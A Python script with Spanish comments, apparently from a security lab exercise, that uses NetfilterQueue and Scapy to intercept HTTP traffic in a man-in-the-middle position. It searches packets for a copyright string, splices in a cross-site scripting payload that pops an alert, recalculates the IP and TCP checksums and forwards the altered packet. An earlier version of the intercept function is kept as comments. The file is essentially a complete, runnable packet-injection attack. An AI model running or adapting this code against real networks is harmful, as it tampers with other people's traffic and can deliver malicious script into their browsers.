from netfilterqueue import NetfilterQueue
from scapy.all import *

# Payload de la inyección de script
PAYLOAD = b'"><script>alert("Has sido hackeado!!")</script>'

def recalculate(pkt_bytes):
    """Recalcula los checksums de un paquete IP y TCP.

    Args:
        pkt_bytes (bytes): Los bytes del paquete a recalcular.

    Returns:
        scapy.layers.inet.IP: El paquete con los checksums recalculados.
    """
    pkt = IP(pkt_bytes)
    if pkt.haslayer('IP') and pkt.haslayer('TCP'):
        del pkt['IP'].chksum
        del pkt['TCP'].chksum
        pkt.show2()
    return pkt

# def intercept(packet):
#     """Intercepta y modifica paquetes que contienen un texto específico.

#     Args:
#         packet (netfilterqueue.Packet): El paquete interceptado por NetfilterQueue.
#     """
#     payload = packet.get_payload()
#     spkt = IP(payload)
#     if spkt.haslayer("Raw") and b'Copyleft 1985-2025' in bytes(spkt[Raw]):
#         # Extraemos los bytes del paquete y modificamos el payload
#         data = bytes(spkt)
#         packet_len = len(data)
#         payload_len = len(PAYLOAD)
#         start = packet_len - payload_len + 1 - 16
#         stop = packet_len - 16
#         data_mod = data[:start] + PAYLOAD + data[stop:]

#         # Recalculamos los campos de control y actualizamos el paquete
#         spkt = recalculate(data_mod)
#         packet.set_payload(bytes(spkt))

#     # Reenviamos el paquete
#     packet.accept()
def intercept(packet):
    try:
        payload = packet.get_payload()
        spkt = IP(payload)

        if spkt.haslayer(TCP) and spkt.haslayer(Raw):
            # Debug básico
            # print(spkt.summary())

            raw_bytes = bytes(spkt[Raw])
            if b'Copyleft 1985-2021' in raw_bytes:
                print("Texto encontrado, intentando modificar...")

                data = bytes(spkt)
                packet_len = len(data)
                payload_len = len(PAYLOAD)

                start = packet_len - payload_len + 1 - 16
                stop = packet_len - 16

                # Validación de índices
                if start < 0 or start >= stop or stop > packet_len:
                    print("Indices invalidos, no modifico este paquete")
                else:
                    data_mod = data[:start] + PAYLOAD + data[stop:]
                    spkt = recalculate(data_mod)
                    packet.set_payload(bytes(spkt))

        packet.accept()
    except Exception as e:
        print(f"Error en intercept: {e}")
        packet.accept()

def main():
    """Función principal que configura y ejecuta NetfilterQueue."""
    nfqueue = NetfilterQueue()
    nfqueue.bind(1, intercept)

    try:
        print("Esperando paquetes HTTP...")
        nfqueue.run()
    except KeyboardInterrupt:
        print("Interrupción del proceso de captura por el usuario.")
    finally:
        nfqueue.unbind()
        print("Limpieza de la cola correctamente realizada.")

if __name__ == "__main__":
    main()